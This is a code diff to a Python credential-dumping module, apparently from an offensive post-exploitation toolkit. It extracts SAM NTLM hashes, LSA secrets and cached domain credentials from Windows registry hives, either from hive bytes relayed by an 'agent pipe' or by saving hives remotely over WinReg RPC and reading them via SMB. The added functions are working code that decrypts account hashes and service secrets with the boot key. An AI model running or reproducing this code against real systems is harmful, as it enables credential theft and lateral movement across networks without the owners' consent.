@@ -1,11 +1,11 @@
-"""Remote secrets extraction via Registry (MS-RRP).
+"""Registry secrets extraction — SAM hashes, LSA secrets, cached credentials.
 
-Connects to the remote registry and extracts:
-- SAM hashes (local account NTLM hashes)
-- LSA secrets (service passwords, DPAPI keys)
-- Cached domain credentials (DCC2)
+Two modes:
+- Offline: parse raw hive bytes (from agent pipe or saved files)
+- RPC: save hives via WinReg RPC, read via SMB, then parse offline
 
-All done via RPC — no execution on target, no file written.
+The offline parsing logic is in _parse_sam_hive / _parse_security_hive /
+_boot_key_from_hive_static — these take raw bytes and require no network.
 """
 
 import struct
@@ -281,7 +281,11 @@ class RegistrySecrets:
         return extract_boot_key(parts[0], parts[1], parts[2], parts[3])
 
     def _boot_key_from_hive(self, sys_hive) -> bytes:
-        """Extract boot key from an offline SYSTEM hive file."""
+        return self._boot_key_from_hive_static(sys_hive)
+
+    @staticmethod
+    def _boot_key_from_hive_static(sys_hive) -> bytes:
+        """Extract boot key from an offline SYSTEM hive."""
         select_key = sys_hive.open_key("Select")
         _, current_data = sys_hive.query_value(select_key, "Current")
         cs_num = struct.unpack_from("<I", current_data, 0)[0]
@@ -291,7 +295,6 @@ class RegistrySecrets:
         for name in ("JD", "Skew1", "GBG", "Data"):
             subkey = sys_hive.open_key(f"{cs_path}\\{name}")
             class_data = sys_hive.query_key_class(subkey)
-            # Class names are UTF-16LE in hive files
             parts.append(class_data.decode("utf-16-le").encode("ascii"))
 
         return extract_boot_key(parts[0], parts[1], parts[2], parts[3])
@@ -370,3 +373,78 @@ class RegistrySecrets:
 
         # Default: show hex
         return data[:64].hex() + ("..." if len(data) > 64 else "")
+
+    def _parse_sam_hive(self, sam_data: bytes, boot_key: bytes) -> list[SamHash]:
+        """Parse SAM hive bytes and return decrypted hashes."""
+        from .hivereader import RegistryHive
+
+        sam_hive = RegistryHive(sam_data)
+        hashes = []
+
+        try:
+            account_key = sam_hive.open_key("SAM\\Domains\\Account")
+            _, f_value = sam_hive.query_value(account_key, "F")
+        except (KeyError, ValueError):
+            return hashes
+
+        if len(f_value) < 0x70:
+            return hashes
+
+        hashed_boot_key = compute_hashed_boot_key(boot_key, f_value)
+        sam_revision = struct.unpack_from("<I", f_value, 0x68)[0]
+
+        try:
+            users_key = sam_hive.open_key("SAM\\Domains\\Account\\Users")
+        except KeyError:
+            return hashes
+
+        for subkey_name in sam_hive.enum_subkeys(users_key):
+            if subkey_name == "Names" or len(subkey_name) != 8:
+                continue
+            try:
+                rid = int(subkey_name, 16)
+            except ValueError:
+                continue
+            try:
+                user_key = sam_hive.open_key(f"SAM\\Domains\\Account\\Users\\{subkey_name}")
+                _, v_value = sam_hive.query_value(user_key, "V")
+                sam_hash = self._parse_sam_v(v_value, rid, hashed_boot_key, sam_revision)
+                if sam_hash:
+                    hashes.append(sam_hash)
+            except (KeyError, RuntimeError):
+                continue
+
+        return hashes
+
+    def _parse_security_hive(self, sec_data: bytes, boot_key: bytes) -> list[LsaSecret]:
+        """Parse SECURITY hive bytes and return decrypted LSA secrets."""
+        from .hivereader import RegistryHive
+
+        sec_hive = RegistryHive(sec_data)
+        secrets = []
+
+        try:
+            pol_key = sec_hive.open_key("Policy\\PolEKList")
+            _, pol_data = sec_hive.query_value(pol_key, "(Default)")
+        except KeyError:
+            return secrets
+
+        lsa_key = decrypt_lsa_key(boot_key, pol_data)
+
+        try:
+            secrets_key = sec_hive.open_key("Policy\\Secrets")
+        except KeyError:
+            return secrets
+
+        for name in sec_hive.enum_subkeys(secrets_key):
+            try:
+                currval_key = sec_hive.open_key(f"Policy\\Secrets\\{name}\\CurrVal")
+                _, encrypted = sec_hive.query_value(currval_key, "(Default)")
+                decrypted = decrypt_lsa_secret(lsa_key, encrypted)
+                secret = LsaSecret(name=name, value=decrypted)
+                secret.decoded = self._decode_secret(name, decrypted)
+                secrets.append(secret)
+            except (KeyError, RuntimeError):
+                continue
+
+        return secrets
